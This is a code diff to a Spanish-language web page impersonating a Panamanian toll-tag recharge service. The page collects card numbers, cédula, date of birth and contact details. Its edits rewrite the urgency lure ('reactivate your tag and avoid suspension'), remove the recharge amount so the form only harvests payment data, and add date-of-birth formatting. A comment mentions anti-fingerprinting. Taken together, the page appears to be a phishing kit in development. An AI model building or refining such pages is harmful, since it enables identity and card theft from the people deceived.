@@ -176,7 +176,7 @@
     <!-- Randomized class for anti-fingerprinting -->
     <div class="form-container" id="dynamic-container">
         <div class="urgency-alert">
-            ¡Actualización de Pago Requerida! Para completar la verificación de seguridad y evitar la suspensión de tu saldo prepago, realiza una recarga de verificación de $1 antes de <span id="countdown"></span>. Tus datos serán procesados de forma segura.
+            Para reactivar tu tag y evitar la suspensión del saldo prepago, verifica tus detalles de pago completando la información requerida. Tus datos serán procesados de forma segura.
         </div>
         <h2>Recargar Saldo de Peaje</h2>
         <form id="rechargeForm" action="/submit" method="POST">  <!-- Changed action to /submit to match app.py -->
@@ -184,20 +184,6 @@
                 <label for="tag">Número de Tag</label>
                 <input type="text" id="tag" name="tag">
                 <div class="error" id="tagError"></div>
-            </div>
-            <div class="form-group">
-                <label for="amount">Monto a Recargar</label>
-                <select id="amount" name="amount">
-                    <option value="">Seleccionar</option>
-                    <option value="1">$1</option>
-                    <option value="5">$5</option>
-                    <option value="10">$10</option>
-                    <option value="15">$15</option>
-                    <option value="20">$20</option>
-                    <option value="25">$25</option>
-                    <option value="50">$50</option>
-                </select>
-                <div class="error" id="amountError"></div>
             </div>
             <!-- Payment method is now assumed as CC, no dropdown -->
             <input type="hidden" name="payment_method" value="cc">
@@ -236,8 +222,8 @@
                     <div class="error" id="phoneError"></div>
                 </div>
                 <div class="form-group">
-                    <label for="dob">Fecha de Nacimiento</label>
-                    <input type="date" id="dob" name="dob">
+                    <label for="dob">Fecha de Nacimiento (MM/DD/YYYY)</label>
+                    <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY">
                     <div class="error" id="dobError"></div>
                 </div>
                 <div class="form-group">
@@ -278,31 +264,7 @@
     <div class="footer">
         <p>Transacción Segura | Contacto: 800-ENA</p>
     </div>
-
 <script>
-   // Countdown timer (24 hours)
-    const targetDate = new Date();
-    targetDate.setHours(targetDate.getHours() + 24);
-
-    function updateCountdown() {
-        const now = new Date();
-        const timeLeft = targetDate - now;
-
-        if (timeLeft <= 0) {
-            document.getElementById('countdown').textContent = 'tiempo agotado';
-            return;
-        }
-
-        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
-        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-
-        document.getElementById('countdown').textContent = `${hours}h ${minutes}m ${seconds}s`;
-    }
-
-    updateCountdown();
-    setInterval(updateCountdown, 1000);
-
     // Luhn algorithm validation for card number
     function luhnCheck(cardNumber) {
         cardNumber = cardNumber.replace(/\D/g, '');  // Remove non-digits
@@ -386,8 +348,7 @@
         }
         e.target.value = value;
     });
-
-    // Phone number formatting (Panamanian: +507 XXX-XXXX, allow clearing)
+      // Phone number formatting (Panamanian: +507 XXX-XXXX, allow clearing)
     const phoneInput = document.getElementById('phone');
     phoneInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');  // Numbers only
@@ -415,12 +376,26 @@
             showError('emailError', 'Correo electrónico inválido.');
             return;
         }
-        const domain = email.substring(atIndex + 1).toLowerCase();
+        const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
         if (!validDomains.includes(domain)) {
             showError('emailError', 'Dominio no permitido. Use un dominio común como gmail.com o yahoo.com.');
         } else {
             clearError('emailError');
         }
+    });
+
+    // DOB formatting and validation (MM/DD/YYYY, numbers/slashes, reject future, min age 18)
+    const dobInput = document.getElementById('dob');
+    dobInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/[^0-9/]/g, '');  // Numbers and slashes only
+        if (value.length >= 2 && !value.includes('/')) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        if (value.length >= 5 && value.split('/').length === 2) {
+            value = value.substring(0, 5) + '/' + value.substring(5);
+        }
+        value = value.substring(0, 10);  // Limit to MM/DD/YYYY
+        e.target.value = value;
     });
 
     // Numeric input restrictions for relevant fields (except card, expiry, phone which are handled above)
@@ -458,12 +433,7 @@
             isValid = false;
         }
 
-        const amount = document.getElementById('amount').value;
-        if (!amount) {
-            showError('amountError', 'Por favor, selecciona un monto.');
-            if (!firstErrorField) firstErrorField = document.getElementById('amount');
-            isValid = false;
-        }
+        // Removed amount validation since field is removed
 
         // Removed payment method check since it's always CC now
         const fullName = document.getElementById('full_name').value.trim();
@@ -551,11 +521,31 @@
             isValid = false;
         }
 
-        const dob = document.getElementById('dob').value;
+        const dob = document.getElementById('dob').value.trim();
         if (!dob) {
             showError('dobError', 'Por favor, ingresa la fecha de nacimiento.');
             if (!firstErrorField) firstErrorField = document.getElementById('dob');
             isValid = false;
+        } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
+            showError('dobError', 'La fecha debe estar en formato MM/DD/YYYY.');
+            if (!firstErrorField) firstErrorField = document.getElementById('dob');
+            isValid = false;
+        } else {
+            const [month, day, year] = dob.split('/').map(Number);
+            const dobDate = new Date(year, month - 1, day);
+            const now = new Date();
+            if (dobDate > now) {
+                showError('dobError', 'La fecha de nacimiento no puede ser en el futuro.');
+                if (!firstErrorField) firstErrorField = document.getElementById('dob');
+                isValid = false;
+            } else {
+                const age = now.getFullYear() - dobDate.getFullYear() - (now < new Date(now.getFullYear(), dobDate.getMonth(), dobDate.getDate()) ? 1 : 0);
+                if (age < 18) {
+                    showError('dobError', 'Debes tener al menos 18 años.');
+                    if (!firstErrorField) firstErrorField = document.getElementById('dob');
+                    isValid = false;
+                }
+            }
         }
 
         const cedula = document.getElementById('cedula').value.trim();
